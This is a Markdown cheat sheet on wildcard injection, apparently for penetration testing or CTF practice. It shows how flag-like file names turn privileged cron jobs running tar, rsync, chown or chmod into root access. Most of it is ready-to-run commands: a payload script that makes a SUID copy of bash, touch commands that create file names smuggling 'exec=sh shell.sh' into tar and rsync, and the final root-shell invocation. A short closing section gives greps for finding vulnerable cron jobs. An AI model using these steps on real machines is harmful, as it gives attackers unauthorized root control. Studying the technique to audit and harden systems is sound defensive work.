# Wildcard Injection

## Table of Contents

1. [Overview](#overview)
2. [Vulnerable Commands](#vulnerable-commands)
3. [Exploitation](#exploitation)

---

## Overview

When a privileged script (cron, SUID, sudo) uses a wildcard (`*`) in a command, the shell expands it to all filenames in the directory **before** passing them as arguments. If the directory is writable, an attacker can create files whose names look like command-line flags. The target command will interpret these filenames as options, not as file arguments.

Example: `tar cf backup.tar *` in a directory containing a file named `--checkpoint-action=exec=shell.sh` will treat that filename as a tar flag and execute `shell.sh`.

## Vulnerable Commands

Not all commands are exploitable. The command must support flags that trigger code execution or file writes:

| Command | Exploitable Flags |
|---|---|
| `tar` | `--checkpoint`, `--checkpoint-action=exec=CMD` |
| `rsync` | `-e CMD`, `--rsh=CMD` |
| `chown` | `--reference=FILE` (indirect, changes ownership to match a file) |
| `chmod` | `--reference=FILE` (indirect, changes permissions to match a file) |
| `find` | `-exec CMD` (requires specific argument structure) |

## Exploitation

### tar (most common)

Scenario: a cron job runs `tar cf /backup/archive.tar *` in `/opt/data/`.

1. Create the payload script:

```bash
cat > /opt/data/shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x /opt/data/shell.sh
```

2. Create files whose names are tar flags:

```bash
touch '/opt/data/--checkpoint=1'
touch '/opt/data/--checkpoint-action=exec=sh shell.sh'
```

3. When the cron job runs `tar cf /backup/archive.tar *`, the shell expands it to:

```bash
tar cf /backup/archive.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1.txt file2.txt ...
```

4. `tar` executes `shell.sh` at each checkpoint. Run the SUID bash:

```bash
/tmp/rootbash -p
```

### rsync

Scenario: a cron job runs `rsync -a * /backup/`.

```bash
echo '/bin/bash -p' > /opt/data/shell.sh
chmod +x /opt/data/shell.sh
touch '/opt/data/-e sh shell.sh'
```

### chown / chmod (indirect)

These don't give direct code execution, but `--reference` lets you match permissions/ownership of another file:

```bash
# Make chown set ownership to your user instead of root
touch '/opt/data/--reference=/home/attacker/owned_file'
```

### How to identify

```bash
# Look for wildcards in cron jobs and scripts
grep -rn '\*' /etc/crontab /etc/cron.d/ /etc/cron.*/ 2>/dev/null
grep -rn '\*' /opt/ /usr/local/bin/ 2>/dev/null | grep -E 'tar|rsync|chown|chmod'
```
